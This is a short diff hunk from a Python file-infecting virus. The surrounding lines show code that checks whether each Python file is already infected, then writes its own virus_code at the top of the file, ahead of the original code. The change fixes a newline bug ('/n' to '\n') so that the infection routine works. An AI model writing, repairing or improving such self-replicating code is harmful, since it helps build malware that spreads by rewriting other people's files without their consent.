@@ -26,7 +26,7 @@ for file in python_files:
     if not infected:
         final_code = []
         final_code.extend(virus_code)
-        final_code.extend('/n')
+        final_code.extend('\n')  # Corrected here
         final_code.extend(file_code)
         with open(file, 'w') as f:
             f.writelines(final_code)
